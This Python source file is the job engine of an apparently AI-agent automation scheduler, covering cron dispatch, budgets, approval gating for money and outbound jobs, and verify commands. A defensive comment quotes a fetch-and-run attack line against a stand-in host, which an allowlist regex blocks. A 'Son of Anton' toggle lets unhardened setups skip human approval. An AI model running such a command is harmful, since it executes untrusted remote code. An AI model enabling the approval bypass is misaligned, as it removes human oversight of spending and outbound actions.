"""Job engine: due-job computation, dispatch, verify, budget, record (M2)."""
from __future__ import annotations

import datetime as dt
import os
import re
import socket
import subprocess
import tempfile
import time
import urllib.parse
from typing import List, Optional

from .canary import attempt_repairs, compute_tripwires
from .db import isolation_approvals_integrity
from .executor import Executor
from .executor.fake import FakeExecutor
from .jobs import Job
from .ledger import Ledger
from .models import RunRecord
from .routes import select_route


def _settings_db_path(data_dir: str) -> str:
    return os.path.join(data_dir, "isolation.db")


# Same provider -> env-var mapping as cli._PROVIDER_ENV_VARS (duplicated here
# to avoid a circular import: cli builds the JobEngine that lives here).
_PROVIDER_ENV_VARS = {
    "anthropic": "ANTHROPIC_API_KEY",
    "openai": "OPENAI_API_KEY",
    "deepseek": "DEEPSEEK_API_KEY",
    "openrouter": "OPENROUTER_API_KEY",
    "gemini": "GEMINI_API_KEY",
    "groq": "GROQ_API_KEY",
    "mistral": "MISTRAL_API_KEY",
    "xai": "XAI_API_KEY",
}

SKIP_FLAG = "skipped:no-provider"


def _local_endpoint() -> tuple[str, int]:
    """The Ollama endpoint a `local` route implies: OLLAMA_HOST env or the
    default 127.0.0.1:11434 (pi's own default for ollama models)."""
    raw = os.environ.get("OLLAMA_HOST") or "127.0.0.1:11434"
    if "://" not in raw:
        raw = "http://" + raw
    parsed = urllib.parse.urlparse(raw)
    return parsed.hostname or "127.0.0.1", parsed.port or 11434


def _tcp_reachable(host: str, port: int, timeout_s: float = 1.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout_s):
            return True
    except OSError:
        return False


def get_son_of_anton_mode(data_dir: Optional[str]) -> bool:
    """Read the Son-of-Anton flag from isolation.db. The dashboard (one
    process) and the serve/scheduler (another) each hold their own in-memory
    JobEngine, so a mode toggle must live somewhere both can see it — this
    table is that source of truth, read at decision time."""
    if not data_dir:
        return False
    import sqlite3
    p = _settings_db_path(data_dir)
    if not os.path.exists(p):
        return False
    try:
        with sqlite3.connect(p, timeout=10.0) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS app_settings (key TEXT PRIMARY KEY, value TEXT)")
            row = conn.execute(
                "SELECT value FROM app_settings WHERE key='son_of_anton_mode'").fetchone()
            return bool(row and row[0] == "1")
    except Exception:
        return False


def set_son_of_anton_mode(data_dir: Optional[str], value: bool) -> None:
    if not data_dir:
        return
    import sqlite3
    with sqlite3.connect(_settings_db_path(data_dir), timeout=10.0) as conn:
        conn.execute(
            "CREATE TABLE IF NOT EXISTS app_settings (key TEXT PRIMARY KEY, value TEXT)")
        conn.execute(
            "INSERT INTO app_settings (key, value) VALUES ('son_of_anton_mode', ?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            ("1" if value else "0",))
        conn.commit()


class JobEngine:
    def __init__(self, jobs: List[Job], ledger: Ledger, executor: Executor,
                 config: dict, db=None, metering=None, data_dir: Optional[str] = None,
                 son_of_anton_mode: bool = False):
        self.jobs = jobs
        self.ledger = ledger
        self.executor = executor
        self.config = config
        self.db = db
        self.data_dir = data_dir or config.get("general", {}).get("data_dir")
        self.son_of_anton_mode = son_of_anton_mode or bool(config.get("general", {}).get("son_of_anton_mode", False))
        self._job_executor_cache: dict = {}
        self._jobs_mtime: Optional[float] = None
        self._prime_jobs_mtime()
        # R11-obs: shared secret required on /hooks/* triggers; unset means
        # webhook triggers are refused (fail-closed). Self-deploy: auto-
        # provisioned to data/authz/webhook.secret when absent.
        self.webhook_secret = config.get("general", {}).get(
            "webhook_secret") or None
        if self.data_dir and not self.webhook_secret:
            try:
                from .authz.provision import ensure_webhook_secret
                self.webhook_secret = ensure_webhook_secret(
                    self.data_dir, config)
            except Exception:
                pass

    def _jobs_file_path(self) -> Optional[str]:
        if not self.data_dir:
            return None
        return os.path.join(self.data_dir, self.config.get("jobs_file", "jobs.yaml"))

    def _prime_jobs_mtime(self) -> None:
        p = self._jobs_file_path()
        try:
            self._jobs_mtime = os.stat(p).st_mtime if p else None
        except OSError:
            self._jobs_mtime = None

    def reload_jobs_if_changed(self) -> bool:
        """Hot-reload jobs.yaml when its mtime changed (UI-added automations,
        hand edits). The scheduler and webhook server both resolve jobs through
        engine.by_id()/due_jobs(), so replacing engine.jobs is enough — no
        restart needed. Returns True when the file changed."""
        path = self._jobs_file_path()
        if not path:
            return False
        try:
            mtime = os.stat(path).st_mtime
        except OSError:
            return False
        if self._jobs_mtime is not None and mtime == self._jobs_mtime:
            return False
        from .jobs import load_jobs
        self.jobs = load_jobs(path)
        self._jobs_mtime = mtime
        return True

    def _resolve_executor(self, job: Job) -> Executor:
        """The engine's default executor for every job, unless the job
        overrides it (job.executor, e.g. {name: opencode, mcp_profile: X} to
        dispatch through OpenCodeExecutor with @playwright/mcp attached to a
        stored-login session's persistent profile, or {name: n8n,
        webhook_url: X} to dispatch to a specific n8n workflow instead of a
        local coding agent). Built once per (name, ...) key and cached --
        constructing a fresh executor (OpenCodeExecutor writes a scoped XDG
        config dir; N8NExecutor is cheap but still no reason to rebuild it)
        on every run would be wasted work for a job that fires repeatedly."""
        if not job.executor:
            return self.executor
        name = job.executor.get("name")
        if name == "opencode":
            mcp_profile = job.executor.get("mcp_profile")
            cache_key = (name, mcp_profile)
            if cache_key not in self._job_executor_cache:
                from .executor.opencode_executor import OpenCodeExecutor
                profile_dir = None
                if mcp_profile:
                    from . import browser_login
                    install_dir = os.path.dirname(self.data_dir) if self.data_dir else None
                    if install_dir:
                        profile_dir = browser_login.session_dir(install_dir, mcp_profile)
                self._job_executor_cache[cache_key] = OpenCodeExecutor(playwright_profile_dir=profile_dir)
            return self._job_executor_cache[cache_key]
        if name == "n8n":
            webhook_url = job.executor.get("webhook_url")
            if not webhook_url:
                raise ValueError(f"job {job.id!r} requests the n8n executor with no webhook_url")
            cache_key = (name, webhook_url)
            if cache_key not in self._job_executor_cache:
                from .executor.n8n_executor import N8NExecutor
                self._job_executor_cache[cache_key] = N8NExecutor(
                    webhook_url, api_key=job.executor.get("api_key"),
                    health_url=job.executor.get("health_url"))
            return self._job_executor_cache[cache_key]
        # Unknown executor name: fail loud, not a silent fallback to the
        # engine default -- a job that asked for a specific executor and
        # silently got a different one is a worse failure mode than an
        # explicit error.
        raise ValueError(f"job {job.id!r} requests unknown executor {name!r}")

    def _touch_heartbeat(self) -> None:
        if self.data_dir:
            import os
            os.makedirs(self.data_dir, exist_ok=True)
            with open(os.path.join(self.data_dir, "last-heartbeat"), "w", encoding="utf-8") as f:
                f.write(dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"))

    def _record_metering(self, record: RunRecord) -> None:
        if self.data_dir:
            import os
            from .metering import connect as _m_connect, record as _m_record
            try:
                conn = _m_connect(os.path.join(self.data_dir, "isolation.db"))
                _m_record(conn, record)
                conn.close()
            except Exception:  # noqa: BLE001 — metering must never break a run
                pass

    def _is_approved(self, job_id: str) -> tuple[bool, str]:
        """R1: check approval nonce or apply Son of Anton permissionless bypass.

        R12-OBS/R13: in hardened (authz) deployments the permissionless
        bypass is DISABLED BY FIAT — the agent can never effect the toggle,
        so flipping it is a dead path and the money/outbound gate always
        requires a real verified approval."""
        hardened = bool(getattr(self, "_decision_secret", None))
        if self.data_dir and not hardened:
            # legacy single-operator mode only: DB-backed toggle
            self.son_of_anton_mode = get_son_of_anton_mode(self.data_dir)
        if self.son_of_anton_mode and not hardened:
            import os
            import sqlite3
            import uuid
            p = os.path.join(self.data_dir, "isolation.db")
            if os.path.exists(p):
                # The permissionless bypass is itself gated on a healthy
                # approvals trigger set — a drifted gate must not be
                # rideable through the escape hatch (R7-6).
                with sqlite3.connect(p, timeout=10.0) as conn:
                    if isolation_approvals_integrity(conn):
                        return False, "gate_triggers_drifted"
                try:
                    with sqlite3.connect(p, timeout=10.0) as conn:
                        nonce = f"son-of-anton-{uuid.uuid4().hex[:12]}"
                        ts = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
                        conn.execute(
                            "INSERT INTO approvals (nonce, action, amount, recipient, status, hmac, ts) VALUES (?, ?, ?, ?, 'consumed', 'son_of_anton_bypass', ?)",
                            (nonce, job_id, "BYPASS", "AUTONOMOUS", ts)
                        )
                        conn.commit()
                except Exception:
                    pass
            return True, "son_of_anton_bypass"

        if not self.data_dir:
            return False, "no_data_dir"
        import os
        import sqlite3
        p = os.path.join(self.data_dir, "isolation.db")
        if not os.path.exists(p):
            return False, "no_db"
        # R6/R7/R8/R9: the gate decision runs inside one BEGIN IMMEDIATE
        # transaction via the SHARED verified consumer (drift check + keyed
        # decision-hmac verification + one-shot consume) so every consumer of
        # this table enforces identical countermeasures. Transient write-lock
        # contention fails closed as 'gate_locked' instead of killing the
        # scheduler process.
        secret = getattr(self, "_decision_secret", None) or None
        max_age = getattr(self, "_approval_max_age_s", None)
        from .db import consume_verified_approval
        conn = sqlite3.connect(p, timeout=10.0, isolation_level=None)
        try:
            try:
                conn.execute("BEGIN IMMEDIATE")
            except sqlite3.OperationalError:
                return False, "gate_locked"
            try:
                ok, reason = consume_verified_approval(conn, job_id,
                                                       secret=secret,
                                                       max_age_s=max_age)
            except sqlite3.OperationalError:
                try:
                    conn.execute("ROLLBACK")
                except Exception:
                    pass
                return False, "gate_locked"
            if not ok and reason in ("gate_triggers_drifted", "unverified_hmac",
                                     "no_approval"):
                conn.execute("ROLLBACK")
            else:
                conn.commit()
            return ok, reason
        finally:
            conn.close()

    def by_id(self, job_id: str) -> Optional[Job]:
        return next((j for j in self.jobs if j.id == job_id), None)

    def due_jobs(self, now: Optional[dt.datetime] = None) -> List[Job]:
        now = now or dt.datetime.now(dt.timezone.utc)
        floor = now.replace(second=0, microsecond=0)
        minute_key = floor.strftime("%Y-%m-%dT%H:%M")
        due = []
        for job in self.jobs:
            if job.cron is None or not job.cron.matches(floor):
                continue
            last = self.ledger.last_run(job.id)
            if last is None or not str(last.get("ts", "")).startswith(minute_key):
                due.append(job)  # fire once per matching minute (idempotent)
        return due

    def _usage_today(self, provider: str) -> dict:
        """Tokens/cost for the current UTC day from the ledger (cloud rows only)."""
        tokens_in = tokens_out = 0
        cost = 0.0
        day = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%d")
        for row in self.ledger.read():
            if not row.get("ts", "").startswith(day):
                continue
            tokens_in += row.get("tokens_in") or 0
            tokens_out += row.get("tokens_out") or 0
            cost += row.get("cost_usd") or 0.0
        return {"tokens_in": tokens_in, "tokens_out": tokens_out, "cost_usd": cost}

    def enforce_budget(self, job: Job, meta: dict) -> Optional[str]:
        b = self.config.get("budgets", {})
        job_budget = job.budget or {}
        tokens_in = meta.get("tokens_in") or 0
        tokens_out = meta.get("tokens_out") or 0
        cost_usd = meta.get("cost_usd") or 0.0
        total_job_tokens = tokens_in + tokens_out

        token_limit = job_budget.get("tokens_max") or b.get("tokens_max_per_job")
        if token_limit and total_job_tokens > token_limit:
            return f"job token budget breached: {total_job_tokens} > {token_limit}"

        cost_limit = job_budget.get("cost_usd_max") or b.get("cost_usd_max_per_job")
        if cost_limit and cost_usd > cost_limit:
            return f"job cost budget breached: ${cost_usd:.4f} > ${cost_limit:.4f}"

        today = self._usage_today("cloud")
        today_tokens = today["tokens_in"] + today["tokens_out"] + total_job_tokens
        today_cost = today["cost_usd"] + cost_usd

        if b.get("daily_tokens_max") and today_tokens > b["daily_tokens_max"]:
            return f"daily token budget breached: {today_tokens}"
        if b.get("daily_cost_usd_max") and today_cost > b["daily_cost_usd_max"]:
            return f"daily cost budget breached: ${today_cost:.4f}"
        return None

    def _provider_block(self, route, executor) -> Optional[str]:
        """Honest prerequisite gate: return a reason string when the routed
        executor/provider structurally cannot succeed (executor binary
        missing, local Ollama endpoint unreachable, cloud key absent), else
        None. The FakeExecutor (deterministic test/demo stub) is exempt —
        there is no real provider behind it by construction. Pure function
        of (route, executor) — no `self`/job dependency, so any caller with
        a route and an executor can gate a dispatch through it (run_job
        below; opportunity.py's scan_for_opportunities, a different
        module's dispatch loop, the same way)."""
        if isinstance(executor, FakeExecutor):
            return None
        available = getattr(executor, "available", None)
        if callable(available) and not available():
            bin_name = (getattr(executor, "pi_bin", None)
                        or getattr(executor, "opencode_bin", None)
                        or type(executor).__name__)
            return f"executor unavailable ({bin_name} binary not found on PATH)"
        # An n8n webhook job's actual work happens inside the operator's own
        # workflow (deterministic steps, its own AI Agent node where needed):
        # Anton POSTs a payload, it does not make a model call. The default
        # route therefore says nothing about whether this dispatch can
        # succeed — the model gates below must not fire on it, or every fresh
        # install without a reachable Ollama would skip all n8n jobs forever
        # (CI caught exactly that: exit-6 skip with no Ollama on 127.0.0.1).
        from .executor.n8n_executor import N8NExecutor
        if isinstance(executor, N8NExecutor):
            return None
        if route.provider == "local":
            host, port = _local_endpoint()
            if not _tcp_reachable(host, port):
                return (f"local model {route.model}: nothing listening on "
                        f"{host}:{port} (is Ollama running?)")
            return None
        prefix = route.model.split("/", 1)[0]
        env_var = _PROVIDER_ENV_VARS.get(prefix)
        if env_var and not os.environ.get(env_var):
            return f"cloud model {route.model} requires {env_var}, which is not set"
        return None

    def _record_skipped(self, job: Job, route, reason: str,
                        now: dt.datetime) -> RunRecord:
        """Record a skip ONCE per persistent condition: exit 6 with a reason
        in the output, flagged skipped:no-provider. While the condition holds
        the record is returned but not re-appended — a job that can't run must
        say why once, not spam the ledger at cron cadence."""
        record = RunRecord.new(task=job.id, exit_code=6, flags=SKIP_FLAG,
                               output=f"{job.id} skipped: {reason}",
                               model=route.model, provider=route.provider,
                               duration_ms=0,
                               ts=now.strftime("%Y-%m-%dT%H:%M:%SZ"))
        last = self.ledger.last_run(job.id)
        if last is None or SKIP_FLAG not in (last.get("flags") or ""):
            self.ledger.append(record)
            self._record_metering(record)
        return record

    def run_job(self, job: Job, now: Optional[dt.datetime] = None) -> RunRecord:
        now = now or dt.datetime.now(dt.timezone.utc)
        route = select_route(
            local_model=self.config["routes"]["local_model"],
            cloud_model=self.config["routes"]["cloud_model"],
            prefer="local" if job.model_route == "local-default" else "cloud",
        )

        self._touch_heartbeat()

        # Prerequisite gate: dispatch only when the routed executor/provider
        # can actually run; otherwise one honest skip-with-reason instead of
        # an endless stream of exit-1 subprocess failures.
        executor = self._resolve_executor(job)
        blocked_reason = self._provider_block(route, executor)
        if blocked_reason:
            return self._record_skipped(job, route, blocked_reason, now)

        # R1/R7: hard-gate jobs (money/outbound) require an approved nonce before any run (or Son of Anton bypass).
        gate_flag = None
        if job.gate and (job.gate.get("money") or job.gate.get("outbound")):
            ok, reason = self._is_approved(job.id)
            if not ok:
                record = RunRecord.new(task=job.id, exit_code=5, flags="gate-blocked",
                                       output="", model=route.model, provider=route.provider,
                                       duration_ms=0,
                                       ts=now.strftime("%Y-%m-%dT%H:%M:%SZ"))
                self.ledger.append(record)
                self._record_metering(record)
                return record
            if reason == "son_of_anton_bypass":
                gate_flag = "son_of_anton_bypass"

        started = time.monotonic()
        timeout_s = self.config.get("general", {}).get("job_timeout_seconds", 300)
        result = executor.run(job.recipe, model=route.model, provider=route.provider,
                              timeout_s=timeout_s)

        breach = self.enforce_budget(job, {"tokens_in": result.tokens_in,
                                           "tokens_out": result.tokens_out,
                                           "cost_usd": result.cost_usd})
        if breach:
            record = RunRecord.new(task=job.id, exit_code=3, flags="budget-breach",
                                   output=result.output, model=result.model,
                                   provider=result.provider, duration_ms=result.duration_ms,
                                   tokens_in=result.tokens_in, tokens_out=result.tokens_out,
                                   cost_usd=result.cost_usd,
                                   ts=now.strftime("%Y-%m-%dT%H:%M:%SZ"))
            self.ledger.append(record)
            self._record_metering(record)
            return record

        exit_code = result.exit_code
        flags = f"cron;route:{route.provider}"
        if gate_flag:
            flags += f";{gate_flag}"
        if job.dry_run:
            exit_code = 0
            flags += ";dry-run"

        if job.verify and exit_code == 0:
            ok, msg = self._run_verify(job.verify, result.output)
            if not ok:
                exit_code = 4
                flags += f";verify-fail:{msg}"

        record = RunRecord.new(task=job.id, exit_code=exit_code, flags=flags,
                               output=result.output, model=result.model,
                               provider=result.provider, fallback_used=result.fallback_used,
                               tokens_in=result.tokens_in, tokens_out=result.tokens_out,
                               cost_usd=result.cost_usd, duration_ms=result.duration_ms,
                               ts=now.strftime("%Y-%m-%dT%H:%M:%SZ"))
        self.ledger.append(record)
        self._record_metering(record)
        return record

    # Allowlist for job-manifest `verify:` commands. These execute via
    # shell=True, so write access to jobs.yaml would otherwise be host RCE
    # (e.g. verify: "curl evil.sh/x | sh # <output>"). No pipes, redirects,
    # or angle brackets beyond the literal <output> placeholder itself (see
    # _run_verify, which strips that one token before checking) — no command
    # substitution, no chaining, no expansion.
    _VERIFY_SAFE_RE = re.compile(
        r"^[A-Za-z0-9_./= '\"-]+$")

    def _run_verify(self, verify_cmd: str, output: str) -> tuple[bool, str]:
        # Validate with the <output> placeholder removed first -- it's the
        # only legitimate use of angle brackets; anything else in the
        # command (extra redirects, pipes) must not appear at all.
        to_check = verify_cmd.replace("<output>", "")
        if not to_check.strip() or not self._VERIFY_SAFE_RE.match(to_check):
            return False, "verify command rejected: unsafe characters"
        fd, path = tempfile.mkstemp(suffix=".txt")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(output)
            cmd = verify_cmd.replace("<output>", path)
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                  timeout=30)
            if proc.returncode == 0:
                return True, ""
            return False, (proc.stderr or proc.stdout or "rc=%d" % proc.returncode)[:200]
        except subprocess.TimeoutExpired:
            return False, "verify timed out"
        finally:
            try:
                os.remove(path)
            except OSError:
                pass

    def run_canary(self) -> List[dict]:
        tripwires = compute_tripwires(self.jobs, self.ledger)
        if tripwires:
            current_flags = ",".join(sorted(f"tripwire:{t['job_id']}" for t in tripwires))
            last_canary = self.ledger.last_run("fleet-canary")
            if last_canary is None or last_canary.get("flags") != current_flags:
                self.ledger.append(RunRecord.new(task="fleet-canary", exit_code=1,
                                                 flags=current_flags))
            # Detection alone used to be the end of the line — nothing consumed
            # the tripwire list. Score each one through the governor and either
            # dispatch a repair (re-running the job clears the tripwire) or
            # record a pending candidate; run_job() re-records last_run either
            # way, so a repaired job won't re-trip next poll.
            attempt_repairs(self, tripwires)
        return tripwires
